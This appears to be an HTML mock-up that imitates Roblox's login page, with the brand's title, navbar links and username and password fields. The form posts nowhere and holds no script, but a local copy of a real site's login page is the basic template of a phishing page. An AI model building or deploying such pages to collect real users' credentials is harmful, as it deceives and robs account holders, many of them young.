<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Log in to Roblox</title>
    <link rel="icon" type="image/png" href="images/favicon.ico">
    <link rel="stylesheet" href="main.css">
</head>
<body>

<div>
    <div class="navbar">
        <div class="navbar-container" >
            <div class="logo">
                <img src="images/robloxicon.png" alt="Roblox Logo"></img>
            </div>
            <a href="https://www.roblox.com/charts">Charts</a>
            <a href="https://www.roblox.com/catalog">Marketplace</a>
            <a href="https://create.roblox.com/">Create</a>
            <a href="https://www.roblox.com/upgrades/robux?ctx=navpopover">Robux</a>
            <input type="text" placeholder="Search">
            <button>Sign Up</button>
        </div>
    </div>
</div>


<div class="login-container">
    <div class="login-box">
        <h1>Log in to Roblox</h1>
        <form action="#">
            <input type="text" placeholder="Username/Email/Phone">
            <input type="password" placeholder="Password"></input>
        </form>
        <button>Log In</button>
        <a href="#">Forgot Password or Username?</a>
    </div>
</div>


</body>
</html>
